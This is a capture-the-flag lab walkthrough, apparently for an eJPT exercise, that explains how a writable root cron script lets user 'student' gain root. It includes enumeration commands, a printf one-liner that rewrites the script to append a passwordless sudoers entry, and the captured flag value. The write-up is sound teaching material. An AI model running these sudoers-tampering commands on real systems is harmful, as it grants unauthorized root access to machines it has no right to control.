# 🧠 Big Picture (read this first)

You are a low-privilege user (`student`) on a Linux system. A root cron job runs every minute and executes a writable script. By modifying that script, you force root to execute your commands, which gives you root access.

**This is misconfiguration-based privilege escalation, not a kernel exploit.**

## Step-by-Step Explanation

### 🔹 Step 1: Access the Kali Machine

**Why:** You need an attacker machine (Kali) to interact with the lab environment.

Nothing security-related yet—just setup.

### 🔹 Step 2: Check Target Reachability

```bash
ping -c4 target.ine.local
```

**Why:** Confirms:
- Network connectivity
- DNS resolution
- Target is online

This avoids wasting time attacking an unreachable system.

### 🔹 Step 3: Access the Exposed Service (Port 8000)

```
http://target.ine.local:8000
```

**What's happening:** A service is exposing a web-based Linux terminal.

**Security issue:** This service already gives you a shell as user `student`.

**This is your initial foothold.**

### 🔹 Step 4: Inspect Home Directory Permissions

```bash
ls -l
```

You notice:
- A file named `message`
- Owned by `root`
- Not readable by `student`

**Why this matters:** There is sensitive data, but you don't have permission. You must escalate privileges.

### 🔹 Step 5: Search for the File System-Wide

```bash
find / -name message
```

**Why:** If the file exists elsewhere:
- It may be copied
- It may be processed by automation
- It may leak data indirectly

### 🔹 Step 6: Discover `/tmp/message` Being Overwritten

```bash
ls -l /tmp/
```

You observe:
- `/tmp/message` exists
- Timestamp updates every minute

**Critical insight:** Something (likely cron) is copying `message` regularly.

### 🔹 Step 7: Locate the Script Responsible

```bash
grep -nri "/tmp/message" /usr
```

**Why grep works:** If a script copies the file, it must reference:
- `/tmp/message`
- The original source

This finds:

```
/usr/local/share/copy.sh
```

### 🔹 Step 8: Check Script Permissions and Contents

```bash
ls -l /usr/local/share/copy.sh
cat /usr/local/share/copy.sh
```

You discover:
- Script is owned by root
- Script is writable by student
- Script copies `message` to `/tmp`

🚨 **This is the vulnerability.**

## 🔴 Vulnerability Identified

**A root-executed cron job runs a script that is writable by a low-privilege user**

**This is a textbook privilege escalation flaw.**

### 🔹 Step 9: No Text Editor Available

```bash
vim / nano / vi
```

Editors are missing.

**Why this matters:** You must modify the script using shell primitives instead.

### 🔹 Step 10: Overwrite Script Using `printf`

```bash
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

**What this does:**
- Replaces the original script
- Adds a sudoers entry
- Grants `student` passwordless sudo

**Why this works:**
- Cron runs as root
- Root executes this script
- Root modifies `/etc/sudoers`

**You are forcing root to help you.**

### 🔹 Step 11: Wait for Cron Execution

```bash
sudo -l
```

After ~1 minute, you see:

```
(student) NOPASSWD: ALL
```

**Meaning:** Privilege escalation is successful.

### 🔹 Step 12: Become Root

```bash
sudo su
```

**Why this works:**
- No password required
- Full root shell granted

### 🔹 Step 13: Retrieve the Flag

```bash
cd /root
cat flag
```

**Flag:**

```
697914df7a07bb9b718c8ed258150164
```

# CTF 2

https://systemweakness.com/host-network-penetration-testing-system-host-based-attacks-ctf-2-ejpt-caead9214deb
